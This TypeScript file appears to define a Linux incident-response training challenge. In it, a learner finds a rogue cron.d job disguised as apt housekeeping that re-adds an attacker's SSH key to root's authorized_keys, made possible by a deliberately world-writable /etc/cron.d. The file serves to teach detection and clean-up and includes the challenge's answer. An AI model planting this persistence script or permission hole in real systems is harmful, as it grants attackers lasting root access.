import {
  listedDir,
  readFile,
  removedFile,
  submittedAnswer,
  type Challenge,
  type ChallengeSetup,
} from '../game/challenge';
import { Machine } from '../system/Machine';

/** The address the break-in came from in challenge 2; the same attacker left this behind. */
const ATTACKER_IP = '198.51.100.66';
/** The comment on the SSH key the attacker's job keeps re-adding: what Dana wants reported. */
const KEY_NAME = 'harbor-ops@fleet';
/** The whole key line, as it appears in the payload and in root's authorized_keys. */
const ATTACKER_KEY =
  'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHk9r2Qw0b5mZ8cJf3Xn7pLtV6yqD4sB1aR0eU2gN3x ' + KEY_NAME;

/** The rogue /etc/cron.d entry, disguised as routine apt housekeeping. */
const ROGUE_JOB = `# apt-compat - keep package lists fresh
*/5 * * * * root /usr/local/sbin/apt-compat >/dev/null 2>&1
`;

/** The script that cron runs as root every five minutes: it re-plants the attacker's key. */
const PAYLOAD = `#!/bin/sh
# Ensure maintenance access key is present.
mkdir -p /root/.ssh
chmod 700 /root/.ssh
KEY="${ATTACKER_KEY}"
grep -qxF "$KEY" /root/.ssh/authorized_keys 2>/dev/null || echo "$KEY" >> /root/.ssh/authorized_keys
`;

/** A couple of legitimate cron.d entries, so the rogue one has to be picked out. */
const BACKUP_JOB = `# nightly off-site backup (added by mwalker)
0 2 * * * root /usr/local/bin/backup.sh >/var/log/backup.log 2>&1
`;
const E2SCRUB_JOB = `# /etc/cron.d/e2scrub_all: check one filesystem per week
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all -A -r
`;

const TASK = `From Dana:

We thought Tuesday was over. I changed Marcus's password and locked his
account, and the failed-login flood stopped. But this morning the
monitoring box flagged something new: someone logging in as root over
SSH, from that same outside address as before.

So I checked /root/.ssh/authorized_keys, the list of keys allowed to log
in as root, and there was a key in it I never put there. I deleted it.
Five minutes later it was back.

Something on this box is putting that key back on a schedule. Sam says
that smells like a cron job. Find what is re-opening the door, tell me
the name on the key it keeps adding, and then stop it.
`;

/** A short slice of auth.log: the attacker returning as root with their planted key. */
function buildAuthLog(): string {
  return (
    `Oct  6 02:17:10 harborline sshd[2140]: Accepted publickey for root from ${ATTACKER_IP} port 41022 ssh2: ED25519 SHA256:n0tr3alf1ngerpr1nt\n` +
    `Oct  6 02:17:10 harborline sshd[2140]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)\n` +
    `Oct  7 23:48:51 harborline sshd[9033]: Accepted publickey for root from ${ATTACKER_IP} port 50118 ssh2: ED25519 SHA256:n0tr3alf1ngerpr1nt\n` +
    `Oct  8 04:33:02 harborline sshd[1774]: Accepted publickey for root from ${ATTACKER_IP} port 52790 ssh2: ED25519 SHA256:n0tr3alf1ngerpr1nt\n` +
    `Oct  8 08:30:02 harborline sshd[2733]: Accepted password for newhire from 10.20.0.31 port 52390 ssh2\n`
  );
}

function setup(): ChallengeSetup {
  // Thursday, 8 Oct 2026: two days after the break-in in challenge 2 (Tue 6 Oct),
  // so the campaign clock keeps moving forward. Every mtime below sits before this.
  const machine = new Machine('harborline', new Date('2026-10-08T09:10:00'));
  machine.addUser({ name: 'newhire', uid: 1001, gecos: 'New Hire', password: 'harbor2026', groups: ['adm', 'sudo'] });
  machine.addUser({ name: 'mwalker', uid: 1000, gecos: 'Marcus Walker' });
  machine.addUser({ name: 'dortiz', uid: 1002, gecos: 'Dana Ortiz' });

  const fs = machine.fs;
  const me = { owner: 'newhire', group: 'newhire' };
  fs.writeFile('/home/newhire/task.txt', TASK, { ...me, mtime: new Date('2026-10-08T08:55:00') });
  fs.writeFile('/home/newhire/.bashrc', '# ~/.bashrc\n', me);

  // The planted cron job and its payload. The attacker could drop a root job here
  // because /etc/cron.d is world-writable: the weakness at the heart of this one.
  const root = { owner: 'root', group: 'root' };
  const planted = new Date('2026-10-06T02:16:30');
  fs.writeFile('/etc/cron.d/apt-compat', ROGUE_JOB, { ...root, mode: 0o644, mtime: planted });
  fs.writeFile('/etc/cron.d/0rsync-backup', BACKUP_JOB, { ...root, mode: 0o644, mtime: new Date('2025-11-02T14:20:00') });
  fs.writeFile('/etc/cron.d/e2scrub_all', E2SCRUB_JOB, { ...root, mode: 0o644, mtime: new Date('2024-02-17T00:00:00') });
  // The loose permission that made all of this possible: anyone may write here,
  // so an ordinary user could drop in a job that cron runs as root.
  const cronD = fs.lookup('/etc/cron.d');
  if (cronD.ok) cronD.node.mode = 0o777;

  fs.mkdir('/usr/local/sbin');
  fs.mkdir('/usr/local/bin');
  fs.writeFile('/usr/local/sbin/apt-compat', PAYLOAD, { ...root, mode: 0o755, mtime: planted });
  fs.writeFile(
    '/usr/local/bin/backup.sh',
    '#!/bin/sh\n# Nightly off-site backup of /var/backups.\nrsync -a /var/backups/ backup@10.20.0.40:/srv/backups/harborline/\n',
    { ...root, mode: 0o755, mtime: new Date('2025-11-02T14:20:00') },
  );

  // Root's authorized_keys, holding the key the job keeps re-adding. Last touched
  // a few minutes ago, because the job runs every five minutes.
  fs.mkdir('/root/.ssh', { ...root, mode: 0o700 });
  fs.writeFile('/root/.ssh/authorized_keys', ATTACKER_KEY + '\n', {
    ...root,
    mode: 0o600,
    mtime: new Date('2026-10-08T09:05:01'),
  });

  // The auth log corroborates Dana: root logins from the attacker's address.
  // Readable because newhire is in the adm group, as in challenge 2.
  fs.writeFile('/var/log/auth.log', buildAuthLog(), {
    owner: 'syslog',
    group: 'adm',
    mode: 0o640,
    mtime: new Date('2026-10-08T08:30:02'),
  });

  return { machine, user: 'newhire' };
}

export const scheduledJob: Challenge = {
  id: 'scheduled-job',
  title: 'The Scheduled Job',
  summary:
    'The attacker is back in as root, days after you locked them out. Something on the box is re-opening the door on a timer. Find it and shut it.',
  level: 'Intermediate',
  setup,
  motd:
    'Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-119-generic x86_64)\n\n' +
    'Harborline Logistics. Authorised staff only.\n\n' +
    'Last login: Thu Oct  8 08:30:02 2026 from 10.20.0.31\n',
  briefing:
    'Tuesday’s break-in should have been over: Marcus’s account is locked and his password changed. ' +
    'But root logins from the attacker’s address are back, and a login key keeps reappearing in `/root/.ssh/authorized_keys` ' +
    'minutes after Dana deletes it. Something is re-opening the door on a schedule. Find the [[scheduled job]] behind it, ' +
    'learn how it got there, and stop it.',
  mentor: { name: 'Sam', role: 'Network team' },
  objectives: [
    {
      id: 'read-task',
      title: 'Read the note from Dana',
      intro:
        'Morning. Dana left a `task.txt` in your [[home directory]] about what she is seeing. Read it with `cat` first.',
      outro:
        'So: a key she did not add keeps coming back to root’s login list, five minutes after she removes it. Something is putting it there on a timer.',
      hints: ['Use `cat` on the file in your home directory.', 'The file is `task.txt`.', 'Run: cat task.txt'],
      completeWhen: readFile('/home/newhire/task.txt'),
    },
    {
      id: 'list-cron',
      title: 'Look at the scheduled jobs in /etc/cron.d',
      intro:
        '[[cron]] is the Linux scheduler: it runs commands on a timer. It reads the system file `/etc/crontab`, every file in the `/etc/cron.d` directory, and each user’s own list. A job that re-adds a key every five minutes would live in one of those. Start by listing `/etc/cron.d`.',
      outro:
        'Three files. `0rsync-backup` and `e2scrub_all` are normal, but `apt-compat` is odd: nothing called that ships as a cron.d file on Ubuntu. Read it.',
      hints: ['Give `ls` the path `/etc/cron.d`.', 'Run `ls /etc/cron.d`.', 'Run: ls /etc/cron.d'],
      completeWhen: listedDir('/etc/cron.d'),
    },
    {
      id: 'read-job',
      title: 'Read the suspicious cron job',
      intro:
        'Open `apt-compat` with `cat`. A cron.d line reads: schedule, then the user to run as, then the command. The five fields `*/5 * * * *` mean "every five minutes".',
      outro:
        'There it is: every five minutes, as `root`, it runs `/usr/local/sbin/apt-compat`. Real apt jobs do not look like this, and "as root, every five minutes" matches Dana’s reappearing key exactly. See what that script does.',
      hints: [
        'The file is `/etc/cron.d/apt-compat`.',
        'Use `cat` on it.',
        'Run: cat /etc/cron.d/apt-compat',
      ],
      completeWhen: readFile('/etc/cron.d/apt-compat'),
    },
    {
      id: 'read-payload',
      title: 'Read the script the job runs',
      intro:
        'The job just points at a script. The real behaviour is in `/usr/local/sbin/apt-compat`. Read that file.',
      outro:
        'Now it is clear. The script makes sure a key labelled `' +
        KEY_NAME +
        '` is always in `/root/.ssh/authorized_keys`. Delete the key and five minutes later this puts it straight back. That is [[persistence]]: a foothold that survives you cleaning up. The name on the key, `' +
        KEY_NAME +
        '`, is what Dana wants.',
      hints: [
        'The script is `/usr/local/sbin/apt-compat`.',
        'Use `cat` on it and read what it appends, and where.',
        'Run: cat /usr/local/sbin/apt-compat',
      ],
      completeWhen: readFile('/usr/local/sbin/apt-compat'),
    },
    {
      id: 'weakness',
      title: 'Work out how a root job got planted',
      intro:
        'One thing does not add up: that job runs as root. The attacker got in as `mwalker`, an ordinary user, not root. So how did they drop a root job into `/etc/cron.d`? Look at who is allowed to write to that directory with `ls -ld /etc/cron.d` (or `stat /etc/cron.d`).',
      outro:
        '`drwxrwxrwx`, world-writable. Any user on the box, even an unprivileged one, can drop a file into `/etc/cron.d`, and cron will run it as whatever user the file names, including `root`. That single loose permission turned an ordinary account into root: [[privilege escalation]]. (Loosening permissions to make things "just work" was a habit of Marcus’s.)',
      hints: [
        'Use `ls -ld` on the directory to see the directory’s own permissions, not its contents. `stat` works too.',
        'The `w` in the last group (`drwxrwx`**w**`x`) means everyone can write there.',
        'Run: ls -ld /etc/cron.d',
      ],
      completeWhen: (e) =>
        e.type === 'command' &&
        e.exitCode === 0 &&
        ((e.name === 'ls' && e.args.includes('-ld') && e.args.some((a) => a.includes('cron.d'))) ||
          (e.name === 'stat' && e.args.some((a) => a === '/etc/cron.d' || a === '/etc/cron.d/')) ||
          (e.name === 'find' && e.args.some((a) => a === '-perm'))),
    },
    {
      id: 'remove-job',
      title: 'Stop the job from running again',
      intro:
        'Now shut it off. Delete the rogue job from `/etc/cron.d` so cron stops running the script. Use `sudo` since you are changing a system file (your password is `harbor2026`).',
      outro:
        'Gone. Cron has nothing to run now, so the key will not be re-added. You still have to clear the copy already sitting in root’s `authorized_keys`, and close that wide-open directory, but the bleeding has stopped.',
      hints: [
        'Remove the file `/etc/cron.d/apt-compat`.',
        'Use `sudo rm` so you have permission to remove a root-owned file.',
        'Run: sudo rm /etc/cron.d/apt-compat',
      ],
      completeWhen: removedFile('/etc/cron.d/apt-compat'),
    },
    {
      id: 'submit',
      title: 'Report the key’s name to Dana',
      intro:
        'Tell Dana the name on the key the attacker kept re-adding, so she can hunt for it everywhere else too. `submit` it.',
      hints: [
        'It is the comment at the end of the key line, in the script and in `/root/.ssh/authorized_keys`.',
        'Submit just the name, nothing else.',
        `Run: submit ${KEY_NAME}`,
      ],
      completeWhen: submittedAnswer,
    },
  ],
  expertObjectives: [
    {
      id: 'find-persistence',
      title: 'Find what is re-opening root access every few minutes',
      doneWhen: 'read-payload',
      hints: [
        'A key keeps reappearing in `/root/.ssh/authorized_keys` on a timer. That is a [[scheduled job]]: check `/etc/crontab`, `/etc/cron.d`, and user crontabs.',
        'One file in `/etc/cron.d` is not a stock Ubuntu job. Read it, then read the script it runs.',
        'The script re-adds a key to root’s `authorized_keys`. Note the name on that key.',
      ],
    },
    {
      id: 'understand',
      title: 'Work out how an unprivileged user planted a root job',
      doneWhen: 'weakness',
      hints: [
        'The job runs as root, but the attacker only had an ordinary account. Something let them write a root job.',
        'Check the permissions on the directory itself: `ls -ld /etc/cron.d`.',
      ],
    },
    {
      id: 'remediate',
      title: 'Stop it and report the key',
      doneWhen: 'submit',
      hints: [
        'Remove the job: `sudo rm /etc/cron.d/apt-compat`. (You should also delete the planted key and fix the directory’s 777 permission, covered in the debrief.)',
        `Then report the key’s name: submit ${KEY_NAME}`,
      ],
    },
  ],
  debrief: {
    summary:
      'You found how an attacker stays in after the first break-in: a job scheduled to run as root every few minutes, quietly re-adding their SSH key. You read the job, read the script it ran, saw how a loose permission let an ordinary user plant a root task, and removed the job that was re-opening the door.',
    sections: [
      {
        title: 'Persistence: not having to break in twice',
        text: 'Once an attacker is in, they plant something that survives reboots and clean-ups so they keep access without breaking in again. This is [[persistence]]. A [[scheduled job]] that re-adds a login key is a classic form of it; so are a new user account, a modified service, or a line in a login script. The tell is a job you do not recognise doing something security-relevant, touching keys, users, or the network, on a schedule.',
      },
      {
        title: 'Where scheduled jobs hide',
        text: '[[cron]] runs jobs from several places at once: `/etc/crontab`, every file in `/etc/cron.d`, the `/etc/cron.hourly`, `.daily`, `.weekly` and `.monthly` directories, and each user’s personal list (`crontab -l`, stored under `/var/spool/cron/crontabs`). An attacker only needs one of them. When you suspect persistence, check them all, and on a real server also `systemctl list-timers` for systemd timers.',
      },
      {
        title: 'One loose permission did it',
        text: '`/etc/cron.d` was world-writable (`drwxrwxrwx`), so any user, not just root, could drop in a file that cron then ran as root. That is how an ordinary foothold becomes full control: [[privilege escalation]]. Files in `/etc/cron.d` should be owned by root and mode `644`, and the directory itself `755`. Close it with `sudo chmod 755 /etc/cron.d`. Over-loose permissions, the kind Marcus left around, are one of the most common ways a small compromise turns into total control.',
      },
      {
        title: 'Removing the job is not the whole clean-up',
        text: 'You stopped the script, but the key it already planted is still in `/root/.ssh/authorized_keys`, and the directory is still world-writable. Finish the job: delete the `' +
          KEY_NAME +
          '` line from `/root/.ssh/authorized_keys` (here that file holds only their key, so `sudo rm /root/.ssh/authorized_keys` clears it), and run `sudo chmod 755 /etc/cron.d`. Miss either and they walk straight back in.',
      },
      {
        title: 'What a responder does next',
        text: 'Rotate anything the attacker could have reached while they had root, and review the logs around each time the key reappeared (`grep "Accepted publickey for root" /var/log/auth.log`). Then watch: if a new unexpected key or job turns up again, there is another foothold you have not found yet.',
      },
    ],
  },
  answer: KEY_NAME,
};
